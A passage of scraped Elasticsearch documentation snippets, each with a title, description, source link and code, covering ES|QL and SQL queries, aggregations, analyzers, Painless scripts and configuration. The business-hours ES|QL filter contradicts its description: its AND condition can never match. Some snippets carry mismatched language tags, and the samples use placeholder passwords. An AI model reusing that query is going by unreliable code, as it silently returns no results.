https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/left.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL left = LEFT(last_name, 3)\n```\n\n----------------------------------------\n\nTITLE: Using E Function in Elasticsearch SQL\nDESCRIPTION: Returns Euler's number (approximately 2.718281828459045). This function takes no input parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nE()\n```\n\n----------------------------------------\n\nTITLE: Filtering Documents by Directory Path Using Path Hierarchy Tokenizer\nDESCRIPTION: This example uses a term query on the file_path.tree field to filter documents with file paths that exist within a specific directory, matching only files in Alice's May 16, 2017 directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pathhierarchy-tokenizer.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET file-path-test/_search\n{\n  \"query\": {\n    \"term\": {\n      \"file_path.tree\": \"/User/alice/photos/2017/05/16\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP User in Elasticsearch YAML\nDESCRIPTION: Specifies the username for SMTP authentication. This setting is required when smtp.auth is true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.user\n```\n\n----------------------------------------\n\nTITLE: Basic EQL Query Structure\nDESCRIPTION: Demonstrates the basic structure of an EQL query, which requires an event category and a matching condition connected by the 'where' keyword.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_0\n\nLANGUAGE: eql\nCODE:\n```\nevent_category where condition\n```\n\n----------------------------------------\n\nTITLE: Documenting VersionStringDocValuesField class\nDESCRIPTION: This snippet documents the `VersionStringDocValuesField` class. It includes methods for converting and retrieving version data as strings (`asString`), retrieving a list of strings (`asStrings`), and getting `Version` objects (`get`). The `@dynamic_type` annotation suggests this class uses dynamic typing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/mapper-version/src/main/resources/org/elasticsearch/xpack/versionfield/org.elasticsearch.xpack.versionfield.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.versionfield.VersionStringDocValuesField @dynamic_type {\n    String asString(String)\n    String asString(int, String)\n    List asStrings()\n    Version get(Version)\n    Version get(int, Version)\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Paths for Unix-like Systems\nDESCRIPTION: Sets the data and logs paths for Elasticsearch on Unix-like systems (Linux and macOS) using Unix-style paths in the elasticsearch.yml configuration file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/path.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\npath:\n  data: /var/data/elasticsearch\n  logs: /var/log/elasticsearch\n```\n\n----------------------------------------\n\nTITLE: Using Top Metrics Aggregation in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the top_metrics aggregation to select the value of the 'm' field from the document with the largest 's' value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /test/_bulk?refresh\n{\"index\": {}}\n{\"s\": 1, \"m\": 3.1415}\n{\"index\": {}}\n{\"s\": 2, \"m\": 1.0}\n{\"index\": {}}\n{\"s\": 3, \"m\": 2.71828}\nPOST /test/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"tm\": {\n      \"top_metrics\": {\n        \"metrics\": {\"field\": \"m\"},\n        \"sort\": {\"s\": \"desc\"}\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Query String Search Request in JSON\nDESCRIPTION: This code snippet shows the JSON body of a search request using the `query_string` query in Elasticsearch. It specifies the query to search for as well as the default field to search in if none is specified within the query itself.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"(new york city) OR (big apple)\",\n      \"default_field\": \"content\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Documentation Comment Header\nDESCRIPTION: Warning comment indicating the file is auto-generated by ESQL's AbstractFunctionTestCase and should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_first.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Using Runtime Fields with Multi Terms Aggregation\nDESCRIPTION: Creating a multi_terms aggregation using a runtime field to calculate the length of genre values, combined with product field values to form composite buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-multi-terms-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /products/_search\n{\n  \"runtime_mappings\": {\n    \"genre.length\": {\n      \"type\": \"long\",\n      \"script\": \"emit(doc['genre'].value.length())\"\n    }\n  },\n  \"aggs\": {\n    \"genres_and_products\": {\n      \"multi_terms\": {\n        \"terms\": [\n          {\n            \"field\": \"genre.length\"\n          },\n          {\n            \"field\": \"product\"\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Event Sequences Dataset\nDESCRIPTION: Sample dataset showing different event sequences grouped by shared IDs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_17\n\nLANGUAGE: txt\nCODE:\n```\nA, B\nA, B, C\nA, C, B\n```\n\n----------------------------------------\n\nTITLE: Evaluating SQL Plugin Projects (File: build.gradle)\nDESCRIPTION: This snippet consists of various evaluations for SQL plugin-related QA directories, ranging from JDBC configurations to different testing setups such as mixed-node and single-node scenarios.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_9\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:jdbc\nEvaluating project ':x-pack:plugin:sql:qa:jdbc' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/jdbc/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:mixed-node\nEvaluating project ':x-pack:plugin:sql:qa:mixed-node' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/mixed-node/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:sql:qa:server\nEvaluating project ':x-pack:plugin:sql:qa:server' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/sql/qa/server/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Hunspell Filter\nDESCRIPTION: Example of creating an index with a custom analyzer using a configured Hunspell token filter\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-hunspell-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"en\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"my_en_US_dict_stemmer\" ]\n        }\n      },\n      \"filter\": {\n        \"my_en_US_dict_stemmer\": {\n          \"type\": \"hunspell\",\n          \"locale\": \"en_US\",\n          \"dedup\": false\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including LEAST Function Parameters in Markdown\nDESCRIPTION: This code snippet includes the parameters documentation for the LEAST function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/least.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/least.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Executing elasticsearch-saml-metadata Command in Shell\nDESCRIPTION: This snippet shows the synopsis for running the elasticsearch-saml-metadata command with various options to generate a SAML 2.0 Service Provider Metadata file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/saml-metadata.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-saml-metadata\n[--realm <name>]\n[--out <file_path>] [--batch]\n[--attribute <name>] [--service-name <name>]\n[--locale <name>] [--contacts]\n([--organisation-name <name>] [--organisation-display-name <name>] [--organisation-url <url>])\n([--signing-bundle <file_path>] | [--signing-cert <file_path>][--signing-key <file_path>])\n[--signing-key-password <password>]\n[-E <KeyValuePair>]\n[-h, --help] ([-s, --silent] | [-v, --verbose])\n```\n\n----------------------------------------\n\nTITLE: Installing Japanese (kuromoji) Analysis Plugin for Elasticsearch\nDESCRIPTION: This command installs the Japanese (kuromoji) analysis plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-kuromoji\n```\n\n----------------------------------------\n\nTITLE: Shape Fields Centroid Aggregation\nDESCRIPTION: Demonstrates centroid aggregation with shape fields, including both point and polygon geometries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-centroid-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /places\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geometry\": {\n        \"type\": \"shape\"\n      }\n    }\n  }\n}\n\nPOST /places/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"name\": \"NEMO Science Museum\", \"geometry\": \"POINT(491.2350 5237.4081)\" }\n{\"index\":{\"_id\":2}}\n{\"name\": \"Sportpark De Weeren\", \"geometry\": { \"type\": \"Polygon\", \"coordinates\": [ [ [ 496.5305328369141, 5239.347642069457 ], [ 496.6979026794433, 5239.1721758934835 ], [ 496.9425201416015, 5239.238958618537 ], [ 496.7944622039794, 5239.420969150824 ], [ 496.5305328369141, 5239.347642069457 ] ] ] } }\n\nPOST /places/_search?size=0\n{\n  \"aggs\": {\n    \"centroid\": {\n      \"cartesian_centroid\": {\n        \"field\": \"geometry\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an API Key for GitHub Connector Authentication\nDESCRIPTION: Demonstrates how to programmatically create an API key needed by the connector, covering necessary cluster privileges. The API key aids in authenticating with the GitHub instance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Configuration for Microsoft Teams Connector - YAML\nDESCRIPTION: This YAML snippet outlines the required configuration for setting up the Microsoft Teams connector instance. It specifies the fields needed such as client_id, secret_value, tenant_id, username, and password. Each parameter is critical for establishing a valid connection to Azure Active Directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-teams.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# Configuration for Microsoft Teams connector\nclient_id: ab123453-12a2-100a-1123-93fd09d67394\nsecret_value: eyav1~12aBadIg6SL-STDfg102eBfCGkbKBq_Ddyu\ntenant_id: 123a1b23-12a3-45b6-7c8d-fc931cfb448d\nusername: dummy@3hmr2@onmicrosoft.com\npassword: changeme\n```\n\n----------------------------------------\n\nTITLE: PERCENTILE Aggregation Function in SQL\nDESCRIPTION: Calculates the nth percentile of input values. Supports different algorithms (tdigest or hdr) and configuration parameters for percentile calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT languages, PERCENTILE(salary, 95) AS \"95th\" FROM emp\n       GROUP BY languages;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT languages, PERCENTILE(salary / 12.0, 95) AS \"95th\" FROM emp\n       GROUP BY languages;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    languages,\n    PERCENTILE(salary, 97.3, 'tdigest', 100.0) AS \"97.3_TDigest\",\n    PERCENTILE(salary, 97.3, 'hdr', 3) AS \"97.3_HDR\"\nFROM emp\nGROUP BY languages;\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Fingerprint Filter\nDESCRIPTION: Example of using the create index API to configure a custom analyzer that uses the fingerprint filter with whitespace tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-fingerprint-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT fingerprint_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_fingerprint\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"fingerprint\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying and Sorting Employee Data with ESQL\nDESCRIPTION: This ESQL query selects specific columns from the 'employees' table, keeps only certain fields, and sorts the results by first name in ascending order with nulls first. It demonstrates the use of FROM, KEEP, and SORT clauses in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/sortNullsFirst.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, height\n| SORT first_name ASC NULLS FIRST\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to Unsigned Long in ESQL\nDESCRIPTION: Demonstrates converting string values to unsigned long using TO_UNSIGNED_LONG(), TO_ULONG(), and TO_UL() functions. Shows successful conversions of numeric strings and handling of invalid conversion attempts that result in null values with warning messages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_unsigned_long.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str1 = \"2147483648\", str2 = \"2147483648.2\", str3 = \"foo\"\n| EVAL long1 = TO_UNSIGNED_LONG(str1), long2 = TO_ULONG(str2), long3 = TO_UL(str3)\n```\n\n----------------------------------------\n\nTITLE: Creating a Point in Time (PIT) for Consistent Search Results in Elasticsearch\nDESCRIPTION: This example shows how to create a Point in Time (PIT) with a 1-minute retention period. PITs preserve the current index state across multiple searches, ensuring consistent pagination results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_pit?keep_alive=1m\n```\n\n----------------------------------------\n\nTITLE: Querying and Sorting Employee Data with ESQL\nDESCRIPTION: This ESQL query selects the 'first_name', 'last_name', and 'height' columns from the 'employees' table. It then sorts the results by the 'height' column in descending order. This query is useful for retrieving a sorted list of employees based on their height.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/sortDesc.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, height\n| SORT height DESC\n```\n\n----------------------------------------\n\nTITLE: Complete Bucket Selector Aggregation Query Example\nDESCRIPTION: A complete Elasticsearch query demonstrating how to use a bucket selector aggregation with a Painless script. It filters theatre buckets based on whether their maximum cost plus a base cost exceeds a threshold.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-bucket-selector-agg-context.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /seats/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"theatres\": {\n      \"terms\": {\n        \"field\": \"theatre\",\n        \"size\": 10\n      },\n      \"aggs\": {\n        \"max_cost\": {\n          \"max\": {\n            \"field\": \"cost\"\n          }\n        },\n        \"filtering_agg\": {\n          \"bucket_selector\": {\n            \"buckets_path\": { <1>\n              \"max\": \"max_cost\"\n            },\n            \"script\": {\n              \"params\": {\n                \"base_cost\": 5 <2>\n              },\n              \"source\": \"params.max + params.base_cost > 10\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Index Mapping for Geo-Point Data\nDESCRIPTION: This snippet shows how to create an index mapping for geo-point data, with separate fields for latitude and longitude.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/\n{\n  \"mappings\": {\n    \"properties\": {\n      \"lat\": {\n        \"type\": \"double\"\n      },\n      \"lon\": {\n        \"type\": \"double\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Monthly Sales Percentiles in Elasticsearch\nDESCRIPTION: Shows how to use the percentiles_bucket aggregation to calculate the 25th, 50th, and 75th percentiles of monthly sales. It combines a date histogram aggregation with a sum aggregation and then applies the percentiles_bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-percentiles-bucket-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        }\n      }\n    },\n    \"percentiles_monthly_sales\": {\n      \"percentiles_bucket\": {\n        \"buckets_path\": \"sales_per_month>sales\",\n        \"percents\": [ 25.0, 50.0, 75.0 ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Min Aggregation with Missing Value Handling in Elasticsearch\nDESCRIPTION: This snippet illustrates how to use the 'missing' parameter in Min aggregation to handle documents with missing values for the specified field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-min-aggregation.md#2025-04-22_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"aggs\": {\n    \"grade_min\": {\n      \"min\": {\n        \"field\": \"grade\",\n        \"missing\": 10\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Size Parameter in Top Metrics Aggregation\nDESCRIPTION: This example shows how to use the 'size' parameter to return metrics from multiple top documents in top_metrics aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /test/_bulk?refresh\n{\"index\": {}}\n{\"s\": 1, \"m\": 3.1415}\n{\"index\": {}}\n{\"s\": 2, \"m\": 1.0}\n{\"index\": {}}\n{\"s\": 3, \"m\": 2.71828}\nPOST /test/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"tm\": {\n      \"top_metrics\": {\n        \"metrics\": {\"field\": \"m\"},\n        \"sort\": {\"s\": \"desc\"},\n        \"size\": 3\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating SSL Keys for Server and Client in Elasticsearch\nDESCRIPTION: These commands use keytool to generate RSA keys for both server and client. The keys are stored in separate keystores with specified aliases, passwords, and validity periods. Subject Alternative Names (SAN) are included for localhost.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/sql-client/src/test/resources/ssl/readme.txt#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ keytool -v -genkey -keyalg rsa -alias server -keypass password -keystore server.keystore -storepass password -validity 99999 -ext SAN=dns:localhost,ip:127.0.0.1\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ keytool -v -genkey -keyalg rsa -alias client -keypass password -keystore client.keystore -storepass password -validity 99999 -ext SAN=dns:localhost,ip:127.0.0.1\n```\n\n----------------------------------------\n\nTITLE: RRF Pagination Example with Rank Window Size\nDESCRIPTION: Python-like example demonstrating how rank_window_size affects RRF scoring and pagination. Shows the ranked result sets for different documents with two queries and explains how from and size parameters work with rank_window_size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_12\n\nLANGUAGE: python\nCODE:\n```\n     |  queryA   |  queryB    |\n_id: |  1        |  5         |\n_id: |  2        |  4         |\n_id: |  3        |  3         |\n_id: |  4        |  1         |\n_id: |           |  2         |\n```\n\n----------------------------------------\n\nTITLE: Cleaning Up Local Containers\nDESCRIPTION: Stops and removes Docker containers used for PostgreSQL and the connector service. Requires Docker service to be running.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_20\n\nLANGUAGE: sh\nCODE:\n```\ndocker stop postgres\ndocker rm postgres\ndocker stop <container_id>\ndocker rm <container_id>\n```\n\n----------------------------------------\n\nTITLE: Painless Script for Payload Transformation\nDESCRIPTION: This Painless script filters theatre data based on monetary value. It extracts 'money_makers' (plays with value > 50000) and 'duds' (plays with value < 15000), creating a new payload containing these two lists. The script leverages the Java Stream API for data manipulation within the Elasticsearch Watcher transform context.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\n\n        return [\n          'money_makers': ctx.payload.aggregations.theatres.buckets.stream()  <1>\n            .filter(t -> {                                                    <2>\n                return t.money.value > 50000\n            })\n            .map(t -> {                                                       <3>\n                return ['play': t.key, 'total_value': t.money.value ]\n            }).collect(Collectors.toList()),                                  <4>\n          'duds' : ctx.payload.aggregations.theatres.buckets.stream()         <5>\n            .filter(t -> {\n                return t.money.value < 15000\n            })\n            .map(t -> {\n                return ['play': t.key, 'total_value': t.money.value ]\n            }).collect(Collectors.toList())\n          ]\n      \n```\n\n----------------------------------------\n\nTITLE: Using Script Score Function in Elasticsearch Query\nDESCRIPTION: This snippet demonstrates how to use the script_score function within a function_score query to customize a document's score using a script that incorporates document field values. Parameters include the script source for computation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"query\": {\n        \"match\": { \"message\": \"elasticsearch\" }\n      },\n      \"script_score\": {\n        \"script\": {\n          \"source\": \"Math.log(2 + doc['my-int'].value)\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Computing Hourly Error Rate with CASE in ESQL\nDESCRIPTION: This query uses the CASE function to identify error messages, then calculates an hourly error rate as a percentage of total messages. It demonstrates time-based aggregation and sorting in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/case.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| EVAL error = CASE(message LIKE \"*error*\", 1, 0)\n| EVAL hour = DATE_TRUNC(1 hour, @timestamp)\n| STATS error_rate = AVG(error) by hour\n| SORT hour\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Keys in Painless\nDESCRIPTION: Shows how to handle missing fields in Painless scripts by using a conditional check before accessing field values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nif (!doc.containsKey('myfield') || doc['myfield'].empty) { return \"unavailable\" } else { return doc['myfield'].value }\n```\n\n----------------------------------------\n\nTITLE: Sorting Buckets by Top Metrics Results\nDESCRIPTION: This example shows how to sort buckets in a terms aggregation by the results of a top_metrics aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /node/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"ip\": {\n      \"terms\": {\n        \"field\": \"ip\",\n        \"order\": {\"tm.m\": \"desc\"}\n      },\n      \"aggs\": {\n        \"tm\": {\n          \"top_metrics\": {\n            \"metrics\": {\"field\": \"m\"},\n            \"sort\": {\"date\": \"desc\"}\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-level Nested Sorting in Elasticsearch\nDESCRIPTION: Shows sorting with multiple levels of nested fields (parent and child) including filters at each nested level.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n   \"query\": {\n      \"nested\": {\n         \"path\": \"parent\",\n         \"query\": {\n            \"bool\": {\n                \"must\": {\"range\": {\"parent.age\": {\"gte\": 21}}},\n                \"filter\": {\n                    \"nested\": {\n                        \"path\": \"parent.child\",\n                        \"query\": {\"match\": {\"parent.child.name\": \"matt\"}}\n                    }\n                }\n            }\n         }\n      }\n   },\n   \"sort\" : [\n      {\n         \"parent.child.age\" : {\n            \"mode\" :  \"min\",\n            \"order\" : \"asc\",\n            \"nested\": {\n               \"path\": \"parent\",\n               \"filter\": {\n                  \"range\": {\"parent.age\": {\"gte\": 21}}\n               },\n               \"nested\": {\n                  \"path\": \"parent.child\",\n                  \"filter\": {\n                     \"match\": {\"parent.child.name\": \"matt\"}\n                  }\n               }\n            }\n         }\n      }\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Events Outside Business Hours in ESQL\nDESCRIPTION: This snippet shows how to filter events that occurred outside of business hours (before 9 AM or after 5 PM) using the DATE_EXTRACT function in ESQL. It extracts the hour of day from the @timestamp field and applies the condition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_extract.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE DATE_EXTRACT(\"hour_of_day\", @timestamp) < 9\n    AND DATE_EXTRACT(\"hour_of_day\", @timestamp) >= 17\n```\n\n----------------------------------------\n\nTITLE: Complex ESQL Query with Metadata Fields\nDESCRIPTION: Shows a complex query utilizing metadata fields with multiple operations including WHERE conditions, EVAL for string concatenation, sorting, and field selection.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-metadata-fields.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM ul_logs, apps METADATA _index, _version\n| WHERE id IN (13, 14) AND _version == 1\n| EVAL key = CONCAT(_index, \"_\", TO_STR(id))\n| SORT id, _index\n| KEEP id, _index, _version, key\n```\n\n----------------------------------------\n\nTITLE: Searching All Indices in Elasticsearch\nDESCRIPTION: This snippet shows three equivalent ways to search across all data streams and indices in a cluster: omitting the target, using _all, or using * wildcard. All methods search for documents with user.id matching 'kimchy'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-multiple-data-streams-indices.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n\nGET /_all/_search\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n\nGET /*/_search\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Simple Average with AVG in ESQL\nDESCRIPTION: This example shows how to calculate the average height from the employees table using the AVG function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/avg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS AVG(height)\n```\n\n----------------------------------------\n\nTITLE: Conditional Counting with WHERE Clause in ESQL\nDESCRIPTION: This example demonstrates how to use a WHERE clause to filter rows before counting, effectively performing a conditional count operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/count.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nROW n=1\n| WHERE n < 0\n| STATS COUNT(n)\n```\n\n----------------------------------------\n\nTITLE: Def Type Comparison using '!==': Painless Example\nDESCRIPTION: This snippet showcases the 